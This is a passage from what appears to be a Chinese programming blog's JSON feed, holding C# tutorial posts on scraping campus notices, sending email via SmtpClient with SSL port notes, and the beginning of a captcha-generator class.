class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">Notice</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">region</span> 数据模型</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> title=<span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> link=<span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> DateTime date=DateTime.Now;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> type=<span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> department=<span class=\"built_in\">string</span>.Empty;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Title</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> title;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            title = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> DateTime Date</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> date;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            date = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Link</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            link = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">get</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> link;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Type</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> type;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            type = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Department</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> department;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">set</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            department = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">#<span class=\"keyword\">endregion</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">override</span> <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> <span class=\"title\">ToString</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">string</span>.Format(<span class=\"string\">&quot;标题:&#123;0&#125;\\n时间:&#123;1&#125;\\n链接:&#123;2&#125;\\n&quot;</span>, title, date.ToString(<span class=\"string\">&quot;yyyy-MM-dd&quot;</span>), link);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"问题总结\"><a href=\"#问题总结\" class=\"headerlink\" title=\"问题总结\"></a>问题总结</h2><ul>\n<li>从不同网站上爬取到的日期格式可能不同，为统一格式，可以使用｀DateTime.ParseExact(datastr, parse, System.Globalization.CultureInfo.InstalledUICulture);｀去解析用于表示日期的字符串，然后再转为统一日期格式的字符串。其中，datastr为表示日期的字符串，parse为解析规则。例:<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> parse=<span class=\"string\">&quot;yyyy-M-D&quot;</span>;</span><br><span class=\"line\">DateTime t=DateTime.ParseExact(<span class=\"string\">&quot;2016-9-5&quot;</span>, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class=\"line\"><span class=\"built_in\">string</span> str=t.toString(<span class=\"string\">&quot;yyyy-MM-dd&quot;</span>);<span class=\"comment\">//2016-09-05</span></span><br></pre></td></tr></table></figure></li>\n<li>不用网页的网页编码格式可能不同，有的为GBK,有的问UTF-8;</li>\n<li>用字符串去表达正则表达式的规则时，有两种方法:<ol>\n<li>string s&#x3D;@”\\d+”””;字符串前加@表示字符串按常量解析(注意:双引号用两个双引号来表示)</li>\n<li>string s&#x3D;”\\d+&quot;“;使用转义符</li>\n</ol>\n</li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"前言前几个月用Python写了一个爬虫，用于爬取校园最新通知。最近的C#课程设计中想实现同样的功能，于是按照之前Python代码的思路重构了一下。用Python实现校园通知更新提醒 思路使用C#中的HttpWebRequest库去获取目标url(各个网站的’更多通知’页)的源代码，然后使用 System.Text.RegularExpressions;进行正则匹配。正则表达式应包含三个分组:日期、标题、链接； 准备工作 命名空间导入123using System.Net;using System.Collections;using System.Text.RegularExpressions; 源代码Spider基类: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public class Spider&#123; private string url = string.Empty;//要爬取的网页的url public HttpWebRequest request; public HttpWebResponse response; public string encode = &quot;UTF-8&quot;;//目标url的网页编码格式 public string Method = string.Empty; public string Url &#123; get &#123; return url; &#125; set &#123; url = value; &#125; &#125; public string Encode &#123; get &#123; return encode; &#125; set &#123; if (value == &quot;UTF-8&quot; || value == &quot;GBK&quot;) &#123; encode = value; &#125; else &#123; //Todo:handle exception &#125; &#125; &#125; public Spider(string url,string method) &#123; this.url = url; this.Method = method; Create(); &#125; public Spider() &#123; &#125; public void Create() &#123; request = (HttpWebRequest)WebRequest.Create(url); request.Method = Method; request.Credentials = CredentialCache.DefaultCredentials; request.UserAgent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;; &#125; //获取目标url的Html代码 public string getHtml() &#123; string reader = string.Empty; try &#123; Create(); response = (HttpWebResponse)request.GetResponse(); if (response.StatusCode == HttpStatusCode.OK) &#123; StreamReader sr = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encode)); reader = sr.ReadToEnd(); sr.Close(); response.Close();//关闭response响应流 &#125; else throw new Exception(); &#125; catch(Exception e) &#123; Log.Write( e.Message, &quot;Exception&quot;); MessageBox.Show(e.Message, &quot;错误&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error); &#125; return reader; &#125;&#125; SpiderNotice类: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class SpiderNotice : Spider&#123; private string url_main;//各个通知链接的公共部分 private string department;//所属部门 private string type;//通知类型 private string pattern;//用于匹配的正则表达式规则 private ArrayList all_notice = new ArrayList();//所有的通知 public string parse = string.Empty;//日期的解析规则 public SpiderNotice(string url, string pattern, string url_main, string department, string type) : base(url, &quot;GET&quot;) &#123; this.department = department; this.pattern = pattern; this.url_main = url_main; this.type = type; this.parse = &quot;yyyy-MM-dd&quot;; &#125; public void Get() &#123; all_notice.Clear(); Regex r = new Regex(pattern, RegexOptions.ExplicitCapture); try &#123; string s = getHtml(); if (s == null) throw new ArgumentNullException(&quot;html&quot;); MatchCollection mc = r.Matches(s); foreach (Match m in mc) &#123; GroupCollection group = m.Groups; DateTime date = DateTime.ParseExact(group[&quot;date&quot;].Value, parse, System.Globalization.CultureInfo.InstalledUICulture); string link = url_main + group[&quot;link&quot;].Value; Notice n = new Notice(); n.Title = group[&quot;title&quot;].Value; n.Link = link; n.Date = date; n.Department = department; n.Type = type; all_notice.Add(n); &#125; &#125; catch (Exception e) &#123; BLL.Log.Write(e.Message, &quot;Exception&quot;); MessageBox.Show(e.Message, &quot;错误&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error); &#125; &#125; public Notice index(int index) &#123; if (index &gt;= all_notice.Count) throw new IndexOutOfRangeException(); else return all_notice[index] as Notice; &#125; public Notice[] GetAll() &#123; Notice[] All = new Notice[all_notice.Count]; int flag = 0; foreach (object t in all_notice) &#123; All[flag++] = t as Notice; &#125; return All; &#125; public int Count() &#123; return all_notice.Count; &#125;&#125; 数据模型Notice类: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class Notice&#123; #region 数据模型 private string title=string.Empty; private string link=string.Empty; private DateTime date=DateTime.Now; private string type=string.Empty; private string department=string.Empty; public string Title &#123; get &#123; return title; &#125; set &#123; title = value; &#125; &#125; public DateTime Date &#123; get &#123; return date; &#125; set &#123; date = value; &#125; &#125; public string Link &#123; set &#123; link = value; &#125; get &#123; return link; &#125; &#125; public string Type &#123; get &#123; return type; &#125; set &#123; type = value; &#125; &#125; public string Department &#123; get &#123; return department; &#125; set &#123; department = value; &#125; &#125; #endregion override public string ToString() &#123; return string.Format(&quot;标题:&#123;0&#125;\\n时间:&#123;1&#125;\\n链接:&#123;2&#125;\\n&quot;, title, date.ToString(&quot;yyyy-MM-dd&quot;), link); &#125;&#125; 问题总结 从不同网站上爬取到的日期格式可能不同，为统一格式，可以使用｀DateTime.ParseExact(datastr, parse, System.Globalization.CultureInfo.InstalledUICulture);｀去解析用于表示日期的字符串，然后再转为统一日期格式的字符串。其中，datastr为表示日期的字符串，parse为解析规则。例:123string parse=&quot;yyyy-M-D&quot;;DateTime t=DateTime.ParseExact(&quot;2016-9-5&quot;, parse, System.Globalization.CultureInfo.InstalledUICulture);string str=t.toString(&quot;yyyy-MM-dd&quot;);//2016-09-05 不用网页的网页编码格式可能不同，有的为GBK,有的问UTF-8; 用字符串去表达正则表达式的规则时，有两种方法: string s&#x3D;@”\\d+”””;字符串前加@表示字符串按常量解析(注意:双引号用两个双引号来表示) string s&#x3D;”\\d+&quot;“;使用转义符","summary":"前言前几个月用Python写了一个爬虫，用于爬取校园最新通知。最近的C#课程设计中想实现同样的功能，于是按照之前Python代码的思路重构了一下。用Python实现校园通知更新提醒","date_published":"2018-06-20T09:55:22.000Z","tags":["C#","C#","爬虫"]},{"id":"https://zhaoqi.vip/posts/3123403799/","url":"https://zhaoqi.vip/posts/3123403799/","title":"C#中使用SmtpClient发送邮件","content_html":"<p>最近写C#课程设计时需要用C#来发送邮件，但是网上搜的代码经过测试均不能使用，调试了很久也没能成功。最后索性自己对着官方文档撸了一个，期间踩了很多坑，故在此做一总结。</p>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><ul>\n<li>命名空间导入:<code>using System.Net.Mail;</code></li>\n<li>在邮箱设置中开通smtp服务，并获取授权码。<span id=\"more\"></span></li>\n</ul>\n<h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> mailfrom, password, fromwho, host, mailto, subject, body;</span><br><span class=\"line\">mailfrom = <span class=\"string\">&quot;xxx@qq.com&quot;</span>;<span class=\"comment\">//发件人</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> port = <span class=\"number\">25</span>;<span class=\"comment\">//端口号一般为25</span></span><br><span class=\"line\">password = <span class=\"string\">&quot;**********&quot;</span>;<span class=\"comment\">//邮箱密码</span></span><br><span class=\"line\">host = <span class=\"string\">&quot;smtp.xxx.com&quot;</span>;<span class=\"comment\">//主机地址</span></span><br><span class=\"line\">fromwho = <span class=\"string\">&quot;xxx&quot;</span>;<span class=\"comment\">//发件人的签名</span></span><br><span class=\"line\">mailto = <span class=\"string\">&quot;xxx@qq.com&quot;</span>;<span class=\"comment\">//收件人(多个收件人之间以英文逗号间隔)</span></span><br><span class=\"line\">subject = <span class=\"string\">&quot;test&quot;</span>;<span class=\"comment\">//邮件主题</span></span><br><span class=\"line\">body = <span class=\"string\">&quot;xxxxx&quot;</span>;<span class=\"comment\">//邮件正文</span></span><br><span class=\"line\"></span><br><span class=\"line\">SmtpClient smtp;</span><br><span class=\"line\">smtp = <span class=\"keyword\">new</span> SmtpClient(host, port);</span><br><span class=\"line\">smtp.UseDefaultCredentials = <span class=\"literal\">false</span>;</span><br><span class=\"line\">smtp.EnableSsl = <span class=\"literal\">true</span>;<span class=\"comment\">//是否使用SSL加密连接</span></span><br><span class=\"line\">smtp.DeliveryMethod = SmtpDeliveryMethod.Network;<span class=\"comment\">//指定邮件发送方式</span></span><br><span class=\"line\">smtp.Credentials = <span class=\"keyword\">new</span> System.Net.NetworkCredential(mailfrom, password); <span class=\"comment\">//设置用于验证发件人身份的凭证</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">string</span>[] address = mailto.Split(<span class=\"string\">&#x27;,&#x27;</span>);<span class=\"comment\">//收件人地址列表</span></span><br><span class=\"line\">MailMessage msg = <span class=\"keyword\">new</span> MailMessage();<span class=\"comment\">//邮件信息</span></span><br><span class=\"line\">msg.From = <span class=\"keyword\">new</span> MailAddress(mailfrom, fromwho, Encoding.UTF8);</span><br><span class=\"line\">msg.Subject = subject;<span class=\"comment\">//邮件标题</span></span><br><span class=\"line\">msg.SubjectEncoding = Encoding.UTF8;</span><br><span class=\"line\">msg.Body = body;<span class=\"comment\">//邮件正文</span></span><br><span class=\"line\">msg.BodyEncoding = Encoding.UTF8;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; address.Length; i++)</span><br><span class=\"line\">    msg.To.Add(address[i]);</span><br><span class=\"line\"></span><br><span class=\"line\">msg.Priority = MailPriority.Normal;<span class=\"comment\">//邮件优先级(High,Low,Normal)</span></span><br><span class=\"line\"><span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    smtp.Send(msg);</span><br><span class=\"line\">\tConsole.WriteLine(<span class=\"string\">&quot;发送成功!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">catch</span> (Exception e)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(e.Message);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">msg.Dispose();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h2><ul>\n<li>代码中所使用的密码不是邮箱密码，应在邮箱设置中获取smtp服务授权码。</li>\n<li>使用163邮箱时只能使用25端口(465&#x2F;994不可用),EnableSsl属性设置为false&#x2F;true</li>\n<li>使用QQ邮箱发送时只能使用25端口(465&#x2F;587不可用),且EnableSsl属性必须设置为true</li>\n<li>代码使用QQ邮箱、163邮箱实测有效，其他邮箱尚不清楚</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>无论是QQ邮箱还是163邮箱，使用SSL端口发送时均出现异常：操作超时，查了好久，发现是因为:System.Net.Mail只支持显式SSL(Explicit SSL)，但是不支持隐式SSL(Implicit SSL)，QQ邮箱使用的应该是Implicit SSL。此问题似乎可以用<code>System.Web.Mail</code>或<code>Cdosys.dll</code>解决，但是还没有试过。<br>关于QQ邮箱使用25端口发送时，必须使用设置SSL为true的原因:服务器从不受保护的25端口响应请求，然后将连接抛到受保护的465端口.<br><strong>显式SSL</strong>通过25端口连接 - &gt; StartTLS（开始加密）- &gt;验证 - &gt;发送数据<br><strong>隐式SSL</strong>StartSSL（开始加密） - &gt; 连接 - &gt; 验证 - &gt;发送数据</p>\n<h2 id=\"参考博客\"><a href=\"#参考博客\" class=\"headerlink\" title=\"参考博客\"></a>参考博客</h2><p><a href=\"https://blog.csdn.net/andrewniu/article/details/52594318\">C#发送邮件三种方法，Localhost，SMTP，SSL-SMTP</a><br><a href=\"https://blogs.msdn.microsoft.com/webdav_101/2008/06/02/system-net-mail-with-ssl-to-authenticate-against-port-465/\">System.Net.Mail with SSL to authenticate against port 465</a><br><a href=\"https://support.microsoft.com/en-us/help/950260/you-cannot-use-system-net-mail-smtpclient-to-send-an-e-mail-message-wi\">You cannot use System.Net.Mail.SmtpClient to send an e-mail message with Implicit SSL</a></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"最近写C#课程设计时需要用C#来发送邮件，但是网上搜的代码经过测试均不能使用，调试了很久也没能成功。最后索性自己对着官方文档撸了一个，期间踩了很多坑，故在此做一总结。 准备工作 命名空间导入:using System.Net.Mail; 在邮箱设置中开通smtp服务，并获取授权码。 源代码1234567891011121314151617181920212223242526272829303132333435363738string mailfrom, password, fromwho, host, mailto, subject, body;mailfrom = &quot;xxx@qq.com&quot;;//发件人int port = 25;//端口号一般为25password = &quot;**********&quot;;//邮箱密码host = &quot;smtp.xxx.com&quot;;//主机地址fromwho = &quot;xxx&quot;;//发件人的签名mailto = &quot;xxx@qq.com&quot;;//收件人(多个收件人之间以英文逗号间隔)subject = &quot;test&quot;;//邮件主题body = &quot;xxxxx&quot;;//邮件正文SmtpClient smtp;smtp = new SmtpClient(host, port);smtp.UseDefaultCredentials = false;smtp.EnableSsl = true;//是否使用SSL加密连接smtp.DeliveryMethod = SmtpDeliveryMethod.Network;//指定邮件发送方式smtp.Credentials = new System.Net.NetworkCredential(mailfrom, password); //设置用于验证发件人身份的凭证string[] address = mailto.Split(&#x27;,&#x27;);//收件人地址列表MailMessage msg = new MailMessage();//邮件信息msg.From = new MailAddress(mailfrom, fromwho, Encoding.UTF8);msg.Subject = subject;//邮件标题msg.SubjectEncoding = Encoding.UTF8;msg.Body = body;//邮件正文msg.BodyEncoding = Encoding.UTF8;for (int i = 0; i &lt; address.Length; i++) msg.To.Add(address[i]);msg.Priority = MailPriority.Normal;//邮件优先级(High,Low,Normal)try&#123; smtp.Send(msg); Console.WriteLine(&quot;发送成功!&quot;);&#125;catch (Exception e)&#123; Console.WriteLine(e.Message);&#125;msg.Dispose(); 注意 代码中所使用的密码不是邮箱密码，应在邮箱设置中获取smtp服务授权码。 使用163邮箱时只能使用25端口(465&#x2F;994不可用),EnableSsl属性设置为false&#x2F;true 使用QQ邮箱发送时只能使用25端口(465&#x2F;587不可用),且EnableSsl属性必须设置为true 代码使用QQ邮箱、163邮箱实测有效，其他邮箱尚不清楚 总结无论是QQ邮箱还是163邮箱，使用SSL端口发送时均出现异常：操作超时，查了好久，发现是因为:System.Net.Mail只支持显式SSL(Explicit SSL)，但是不支持隐式SSL(Implicit SSL)，QQ邮箱使用的应该是Implicit SSL。此问题似乎可以用System.Web.Mail或Cdosys.dll解决，但是还没有试过。关于QQ邮箱使用25端口发送时，必须使用设置SSL为true的原因:服务器从不受保护的25端口响应请求，然后将连接抛到受保护的465端口.显式SSL通过25端口连接 - &gt; StartTLS（开始加密）- &gt;验证 - &gt;发送数据隐式SSLStartSSL（开始加密） - &gt; 连接 - &gt; 验证 - &gt;发送数据 参考博客C#发送邮件三种方法，Localhost，SMTP，SSL-SMTPSystem.Net.Mail with SSL to authenticate against port 465You cannot use System.Net.Mail.SmtpClient to send an e-mail message with Implicit SSL","summary":"最近写C#课程设计时需要用C#来发送邮件，但是网上搜的代码经过测试均不能使用，调试了很久也没能成功。最后索性自己对着官方文档撸了一个，期间踩了很多坑，故在此做一总结。 准备工作 命名空间导入:using System.Net.Mail; 在邮箱设置中开通smtp服务，并获取授权码。","date_published":"2018-06-18T18:41:13.000Z","tags":["C#","C#",".NET"]},{"id":"https://zhaoqi.vip/posts/1000607951/","url":"https://zhaoqi.vip/posts/1000607951/","title":"C#中自己生成验证码","content_html":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近写C#课程设计时，登录验证处需用到验证码，于是参照网上博客，自己封装了一个验证码类，和网上其他博客相比，有以下优点:</p>\n<ul>\n<li>去除了0,o,O与1,l等容易混淆的字符</li>\n<li>使用方便，仅需三行代码</li>\n<li>内置有返回MD5加密后的字符串的方法，便于前端调用<span id=\"more\"></span></li>\n</ul>\n<h2 id=\"函数说明\"><a href=\"#函数说明\" class=\"headerlink\" title=\"函数说明\"></a>函数说明</h2><h3 id=\"公有方法\"><a href=\"#公有方法\" class=\"headerlink\" title=\"公有方法\"></a>公有方法</h3><ul>\n<li>SecurityCode(int length);&#x2F;&#x2F;构造函数</li>\n<li>SecurityCode(int length, int width, int height);&#x2F;&#x2F;构造函数</li>\n<li>void UpdateVerifyCode();&#x2F;&#x2F;刷新验证码</li>\n<li>Bitmap getImage();&#x2F;&#x2F;返回验证码图片</li>\n<li>string MD5Encrypt();&#x2F;&#x2F;返回经MD5加密过的验证码字符串</li>\n<li>bool Check(string text);&#x2F;&#x2F;返回校验结果(不区分大小写)</li>\n</ul>\n<h3 id=\"私有方法\"><a href=\"#私有方法\" class=\"headerlink\" title=\"私有方法\"></a>私有方法</h3><ul>\n<li>void CreateVerificationText(int length);&#x2F;&#x2F;随机生成验证码字符串</li>\n<li>void CreateImage();&#x2F;&#x2F;生成验证码图片</li>\n<li>Color RandColor();&#x2F;&#x2F;生成随机颜色</li>\n<li>Point RandPoint();&#x2F;&#x2F;生成随机点</li>\n</ul>\n<h2 id=\"使用示例\"><a href=\"#使用示例\" class=\"headerlink\" title=\"使用示例\"></a>使用示例</h2><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SecurityCode Code=<span class=\"keyword\">new</span> SecurityCode(<span class=\"number\">4</span>);</span><br><span class=\"line\">code.UpdateVerifyCode();</span><br><span class=\"line\">picturebox.Image=code.getImage();</span><br></pre></td></tr></table></figure>\n<h2 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h2><p><img data-src=\"/images/securitycode.jpg\" alt=\"验证码\"></p>\n<h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">SecurityCode</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Random rand = <span class=\"keyword\">new</span> Random();<span class=\"comment\">//生成随机数</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"built_in\">string</span> VerificationText = <span class=\"built_in\">string</span>.Empty;<span class=\"comment\">//验证码字符串</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> Bitmap map;<span class=\"comment\">//验证码的位图</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"built_in\">int</span> length;<span class=\"comment\">//验证码的字符个数</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"built_in\">int</span> width;<span class=\"comment\">//验证码图片的宽度</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"built_in\">int</span> height;<span class=\"comment\">//验证码图片的高度</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SecurityCode</span>(<span class=\"params\"><span class=\"built_in\">int</span> length, <span class=\"built_in\">int</span> width, <span class=\"built_in\">int</span> height</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.length = length;</span><br><span class=\"line\">            